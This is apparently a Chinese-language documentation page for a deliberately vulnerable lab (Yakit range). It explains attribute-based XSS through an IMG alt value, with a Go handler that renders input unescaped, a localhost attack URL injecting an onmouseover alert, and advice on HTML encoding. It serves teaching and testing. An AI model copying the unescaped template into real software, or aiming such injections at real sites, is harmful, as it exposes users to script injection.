@@ -1,0 +1,66 @@
+---
+sidebar_position: 8
+---
+
+# 08.输出存在于 HTML 节点属性中，但是不再 on 属性中(IMG ALT)
+
+本案例演示了一种 XSS 攻击方式，通过将恶意代码注入到 HTML 节点属性中（如 IMG 标签的 ALT 属性），但不在 on 属性中，从而绕过一些安全机制。
+
+### 示例代码：
+
+以下是一个简化的示例代码，用于说明在 HTML 节点属性中利用 XSS 漏洞。
+
+```HTML
+{
+        DefaultQuery: "value=visitor-name",
+        Path:         "/attr/alt",
+        Title:        "输出存在于HTML节点属性中，但是不再on属性中(IMG ALT)",
+        Handler: func(writer http.ResponseWriter, request *http.Request) {
+        unsafeTemplateRender(writer, request, `<!doctype html>
+<html>
+<head>
+    <title>Example DEMO</title>
+    <!-- ... 省略其他标签 ... -->
+</head>
+<body>
+<div>
+    Hello Visitor!
+    <br>
+    Here are photo for U! <br>
+    <img style='width: 100px' alt='{{.value}}' src="/static/logo.png" onclick='javascript:alert("Welcome CLICK ME!")'/>
+</div>
+</body>
+</html>`, map[string]any{
+            "value": LoadFromGetJSONParam(request, "json", "value"),
+        })
+        writer.Header().Set("Content-Type", "text/html")
+    },
+    RiskDetected: true,
+}
+```
+
+### 攻击示例：
+
+```HTML
+http://127.0.0.1:8787/xss/attr/alt?value=' onmouseover='alert("Hello Yakit")
+
+<!--修改后的标签-->
+<img style='width: 100px' alt='' onmouseover='alert("Hello Yakit")' src="/static/logo.png" .../>
+```
+
+在上述攻击示例中，攻击者通过在`value`参数中注入`' onmouseover='alert("Hello Yakit")`，将恶意代码嵌入到 ALT 属性中。当用户浏览到包含这个 IMG 标签的页面时，当鼠标悬停在图像上时，浏览器会执行嵌入的 JavaScript 代码，弹出一个弹窗。
+
+**防御措施：**
+
+要防范这种类型的漏洞，开发者需要对从用户输入获取的数据进行适当的转义和过滤，确保用户提供的内容不会被解释为 HTML 或 JavaScript 代码。这可以通过使用安全的 HTML 编码函数来实现。
+
+### 靶场演示： 视频
+
+<video
+  src="/img/yaklab/xss/08unsafe-attr.mp4"
+  loop={true}
+  playsInline={true}
+  controls={true}
+  autoPlay={true}
+  style={{ width: 890 }}
+/>
